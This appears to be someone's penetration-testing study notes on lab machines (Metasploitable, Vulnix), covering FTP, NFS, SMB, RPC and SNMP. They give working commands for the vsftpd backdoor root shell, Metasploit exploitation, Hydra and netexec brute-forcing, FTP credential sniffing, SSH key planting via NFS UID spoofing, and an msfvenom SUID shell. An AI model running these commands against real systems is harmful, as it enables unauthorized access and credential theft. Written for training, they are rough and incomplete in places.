# Network Protocols

**Nmap** which is also known as **Network Mapper** is one of the best open-source and the handiest tool that is widely used for security auditing and network scanning by pen-testers. It also provides an additional feature where the results of a network scan can be recorded in various formats.

## FTP

FTP is a file transfer protocol, used to transfer files between a network using TCO/IP connections via Port 20/21. It is basically a client-server protocol. As it works on TCP, it requires two communication channels between client and server: a command channel and data channel. The command channel is for controlling the conversation between client and server whereas data connection is initiated by the server to transfer data.

## **Penetration Testing on FTP**

## **Anonymous Login**

As shown by the nmap scan results, port 21 is open and we can see details about its version. Let's try to access the FTP server using anonymous credentials:

```
ftp 192.168.188.131
Name: Anonymous
Password:Anonymous 
```

Enter anonymous as username and password as shown in the image below as you will find you in the ftp server.

![image](https://github.com/user-attachments/assets/dc3d436e-d908-4af5-9c64-824aae2592fd)


## **Sniffing FTP Login Credential**

By default, the traffic sent to and received from ftp is not encrypted. An attacker can take help of sniffing tools to sniff the data packet traveling between server and client in a network and retrieve credential. And then use them for unauthorized access. As we have discussed above FTP users may authenticate themselves with a **clear-text sign-in protocol** for username and password.

Similarly, if we capture TCP packet through **Wireshark** for sniffing FTP credential. So, now try and log in to ftp using the following commands:

```jsx
ftp 192.168.188.131
```

Capture the traffic using Wireshark. Now, in Wireshark, if you follow the TCP stream of the packet, you can see the login credentials in clear text as shown in the following image:

```jsx
frame contains "PASS"
```

![image](https://github.com/user-attachments/assets/dd775f19-4c5c-466f-a7de-616247522d17)


## **FTP Brute_Force Attack**

Hydra is often the tool of choice for bruteforce. It can perform rapid dictionary attacks against more than 50 protocols, including telnet, FTP, HTTP, HTTPS, SMB, several databases, and much more. Now, to bruteforce our ftp server we need to choose a word list. As with any dictionary attack, the wordlist is key.

Run the following command to execute bruteforce :

```jsx
hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp

```

![image](https://github.com/user-attachments/assets/bfe0cf69-6fa4-4f41-8fbd-c8d032b9fc15)


## login via Nmap script info **(Remote Shell)**

by running NMAP Script scan

```jsx
sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse
```

![image](https://github.com/user-attachments/assets/3acd1d5b-5921-446a-afed-5d2dac2c7c66)


check for the payload in reference section

![image](https://github.com/user-attachments/assets/56c613c7-2240-4abb-ba43-e6e841634335)


try username random 6 characters and password as follows:

```jsx
nc 192.168.188.131 21
USER your_yadav1:)
PASS your_yadav1
```

![image](https://github.com/user-attachments/assets/d2133992-6f10-4dc2-a102-9d9d11049307)


```jsx
nc 192.168.188.131 6200
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
root@metasploitable:/# ls
```

![image](https://github.com/user-attachments/assets/819bab8c-09ef-4d7d-9281-c60c6d85b367)


## **Exploiting Vulnerable FTP version (Remote Shell)**

Metasploit to exploit the vsFTPD 2.3.4 vulnerability

![image](https://github.com/user-attachments/assets/016f5098-b76e-4e75-b770-84132696e883)


```jsx
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.188.131
exploit
python -c 'import pty; pty.spawn("/bin/bash")'
find / -iname user.txt -exec wc {} \;
find / -name "flag.txt"

TO check or kill sessions:
sessions -l

sessions -k 1
```

![image](https://github.com/user-attachments/assets/535e82ff-9bed-4d91-8a92-a8cce3968dd0)


## NFS

A  *Network File System* (*NFS*) allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally. This enables system administrators to consolidate resources onto centralized servers on the network.

run nmap: 

```jsx
nmap -p2049 -sV 192.168.188.131
```

![image.png](attachment:d9919675-c07a-4246-b406-f50b46da4d78:image.png)

publicly accessible NFS share!
“mount the target file system to your machine path”

-nolock should be given to revert.

<aside>

sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock

</aside>

![image.png](attachment:44cd2eac-41b8-43bc-835f-7bbb4ba57738:image.png)

Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)

case2: VulNIX [HackLAB: Vulnix ~ VulnHub](https://www.vulnhub.com/entry/hacklab-vulnix,48/)

Run nmap: 

nmap -sV -p0-65535 192.168.188.137

![image.png](attachment:b7b41150-b88d-490b-a5cc-61d8dd99eb27:image.png)

To identify the mount use:

```jsx
sudo nmap 192.168.188.137 --script nfs-showmount 
```

![image.png](attachment:5c8283dc-4400-4f10-8781-ddb655658ca3:image.png)

try to mount shares and identified access issues:

```jsx
sudo mount 192.168.188.137:/ /home/kali/Downloads/nfs -nolock
```

check the permissions :

![image.png](attachment:a31499be-1aa8-45ee-8913-7ab1a1456408:image.png)

Let’s take a closer look at the permissions. 

```jsx
ls -ld vulnix
```

![image.png](attachment:0b62e0b4-9114-4f1f-a48f-e34bd71d7f2d:image.png)

Since this machine supports NFS 3, we can simply instruct **mount** to use this version of the NFS protocol. identified from nmap version 2-4:

```jsx
sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
```

now check user permission ony vulnix user with groupid 2008 has access

![image.png](attachment:0c17405e-6e98-4ad0-abee-2e17af4a0c1b:image.png)

create a user group:

```jsx
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
sudo -u vulnix ls -l vulnix
```

![image.png](attachment:ee6b9852-077f-4adc-82ff-9565ce149d76:image.png)

DEBUG

```jsx
id vulnix
```

Ensure it outputs:

```jsx
uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
```

If the UID or GID is incorrect, you must delete and recreate the user with:

```jsx
sudo userdel vulnix
sudo groupdel vulnix_group
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
```

Now, try accessing the directory as `vulnix_user`:

```bash
sudo -u vulnix ls -la vulnix

```

![image.png](attachment:f92aa9f2-50e3-4458-b663-b7fe2b1e67d1:image.png)

create ssh key

```jsx
ssh-keygen -t rsa -b 4096 -C "[shankar@google.com](mailto:shankar@google.com)"
```

![image.png](attachment:391b7bcd-dbb5-4451-9b03-cbe962014961:image.png)

Now that we have access to the **vulnix** user’s home directory, we can add our SSH public key in its *authorized_keys* file.

[https://www.notion.so/Network-1be813a9986280ca92b6ded34e06ae28?pvs=4#1c2813a9986280658d9dfbcb0181d50f](https://www.notion.so/OSCP-Guide-1be813a9986280ca92b6ded34e06ae28?pvs=21)

```
cd /Downloads/nfs/home
sudo -u vulnix mkdir vulnix/.ssh
sudo -u vulnix chmod 700 vulnix/.ssh

cat ~/.ssh/id_rsa.pub | sudo -u vulnix tee -a vulnix/.ssh/authorized_keys
sudo -u vulnix chmod 600 vulnix/.ssh/authorized_keys
sudo -u vulnix ls -la vulnix/.ssh/authorized_keys

Debug: try removing auth_keys
sudo -u vulnix rm -f /vulnix/.ssh/authorized_keys

recreate ssh keys as per below screen shot
```

push SSH auth keys & add proper permissions:

![image.png](attachment:af162395-938b-491c-946e-73348242dd15:image.png)

Do SSH on the machine

```jsx
ssh vulnix@192.168.188.137
```

ls -ld vulnix

- 
- cat /etc/exports (Look for no_root_squash or no_all_squash)
• showmount -e targetip
• mkdir /tmp/mount
mount -o rw targetip:/backups /tmp/mount or mount -t nfs ip:/var/backups /tmp/mount (use targetip:/ to mount all shares if multiple
were available)
•
• msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/mount/shell.elf
• chmod +xs shell.elf
• ls -l shell.elf
• ./shell.elf
or
• simpleexecutable.c in ~/stuffs/oscp
• gcc nfs.c -static -w -o nfs
or
• put bash suid there

## SMB

The **Server Message Block (SMB)** protocol is a network communication protocol used for sharing files, printers, serial ports, and other resources between nodes on a network. It operates at the application layer and uses the TCP/IP protocol for transport, typically over TCP port 445

SMB enables various functionalities such as file sharing, printer sharing, network browsing, and inter-process communication (IPC) through named pipes. It serves as the basis for Microsoft's Distributed File System (DFS) implementation. SMB supports both NTLM and Kerberos protocols for user authentication, providing a secure mechanism for accessing shared resources

Enumerations: 

```jsx
Sudo nmap -p 445 -sV -sC 192.168.188.131
```

![image.png](attachment:c6c3270b-8b42-4046-9448-3c519f5e1471:image.png)

list the shares using:

```jsx
option 1: enum4linux -L -S 192.168.188.131
option 2: smbclient -L [192.168.188.131](https://192.168.188.131/tmp) -N
option 3: smbmap -H [192.168.188.131](https://192.168.188.131/tmp)
option 4: netexec smb [192.168.188.131](https://192.168.188.131/tmp) -u '' -p '' --shares
brutforce: netexec smb [192.168.188.131](https://192.168.188.131/tmp) -u admin -p /home/kali/pass.txt --continue-on-success
```

![image.png](attachment:dc68750d-9499-4b5a-85c9-c13e5a5b3d2a:image.png)

Vulnerability exploit:

## Case 1:

SMB Version Samba 3.0.20 found, search for exploits:

```jsx
searchsploit samba 3.0.20  
locate multiple/remote/10095.txt
cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
```

![image.png](attachment:025d8ad1-7857-46ea-9287-d216b2e8b530:image.png)

## Case 2:

Try to connect with no pass

```jsx
smbclient --no-pass [//192.168.188.131/tmp](https://192.168.188.131/tmp)
```

login as Anonymous:

![image.png](attachment:855d2d23-706f-4453-95cd-1979f1c922ea:image.png)

since we have smb access i tried:

```jsx
put [rev.sh](http://rev.sh/)
posix 
chmod +x [rev.sh](http://rev.sh/)
chown Anonymous [rev.sh](http://rev.sh/)
open [rev.sh](http://rev.sh/)

But didnt work:
Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
```

![image.png](attachment:e1c9482f-613b-4b1d-85ab-43392ccfa51d:image.png)

tools-

SMBCLIENT //192.168.0.0.//

smbmap -H 192.0.0.0 -u

NXC

check for null section or find credentials

## Case 3:

SMBMAP

```jsx
smbmap --no-pass -H 192.168.188.131 -u Anonymous
smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q
```

![image.png](attachment:87df134a-49dd-4609-a51c-0daed6f48afb:image.png)

## RPC

RPC (Remote Procedure Call) is **a protocol that allows a program on one computer to execute a procedure or function on another computer, as if it were a local call, without the programmer needing to handle network communication details**

To Connect:

```jsx
rpcclient 192.168.188.131 -U ''

$>  srvinfo   {for server information}
$> enumdomusers   {to enumerate users}
```

![image.png](attachment:caf0167b-fe5b-4101-a67e-d838304e7b0b:image.png)

“RID are relative identifier to identify an object which will be in hexa decimal format”

Query Domain information:

![image.png](attachment:a99fa253-72de-45e3-b55c-ede1b50c8fc1:image.png)

## SNMP

SNMP (Simple Network Management Protocol) is **a widely used application-layer protocol for managing and monitoring network devices, allowing network administrators to collect data and configure devices remotely**. 161 UDP port

**What it does:**

- **Network Management:** SNMP facilitates the exchange of information between network devices (like routers, switches, servers, etc.) and network management systems (NMS).
- **Monitoring:** It allows administrators to monitor the status of network devices, collect performance data, and receive alerts about issues.

**Configuration:** SNMP enables remote configuration and management of network devices.

- **Configuration:** SNMP enables remote configuration and management of network devices.

Enumerate: 

![image.png](attachment:224fba2d-874e-4d91-acb3-973996972862:image.png)

if community string was public try to connect with snmpcheck

![image.png](attachment:0447d784-29d0-414e-839c-950cd1b23572:image.png)

try to use snmp walk

![image.png](attachment:6935c4a9-af3d-4727-8ee5-b04757a0d56f:image.png)

Brutforce snmp:

onesixtyone -c /usr/shares/seclists/Discovery/SNMP/snmap.txt 192.168.146.156

snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects

https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce

## Ldap

LDAP (Lightweight Directory Access Protocol) is **a protocol that allows applications to query and maintain data in a directory service, which is a centralized database for storing information about users, systems, networks, and applications**

## SSH

**Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
https://www.ssh.com/academy/ssh/public-key-authentication

## To create RSA SSH keys, generate a public/private key pair using

```
ssh-keygen
```

, copy the public key to the server's

```
~/.ssh/authorized_keys
```

file, and then log in using the private key.

Here's a step-by-step guide:

**1. Generate the SSH Key Pair:**

- **Open your terminal**: on your local machine.
- Run the `ssh-keygen` command:

Code

```jsx
    ssh-keygen -t rsa -b 4096
```

- `t rsa`: Specifies the RSA algorithm.
- `b 4096`: Specifies the key length (4096 bits is recommended).
- You can also use `b 2048` for a shorter key length.
- **Follow the prompts:**
- Enter the path to save the key (default is `~/.ssh/id_rsa`).
- Enter a passphrase for the private key (optional but recommended for security).
- You'll have a public key (`~/.ssh/id_rsa.pub`) and a private key (`~/.ssh/id_rsa`).

**2. Copy the Public Key to the Server:**

Use the ssh-copy-id command.

Code

```jsx
    ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip_or_hostname
```

- Replace `user` with your username on the server.
- Replace `server_ip_or_hostname` with the server's IP address or hostname.
- **Alternatively, manually copy the public key:**
- Read the contents of `~/.ssh/id_rsa.pub`.
- SSH into the server.
- Create the directory `~/.ssh` if it doesn't exist.
- Create or edit the file `~/.ssh/authorized_keys`.
- Append the contents of your public key to the `authorized_keys` file.
- Change the permissions of `~/.ssh` to `700` and `authorized_keys` to `600`.

Code

```jsx
    mkdir -p ~/.ssh    chmod 700 ~/.ssh   
    touch ~/.ssh/authorized_keys    
    chmod 600 ~/.ssh/authorized_keys    
    cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

**3. Log in with the Private Key:**

- **Open your terminal**: on your local machine.
- Use the `ssh` command with the `i` option:

Code

```jsx
    ssh -i ~/.ssh/id_rsa user@server_ip_or_hostname
```

## SMTP

## POP3

POP3 (Post Office Protocol version 3) is **a widely used protocol for retrieving emails from a mail server, downloading them to a local device, and typically deleting them from the server after download**
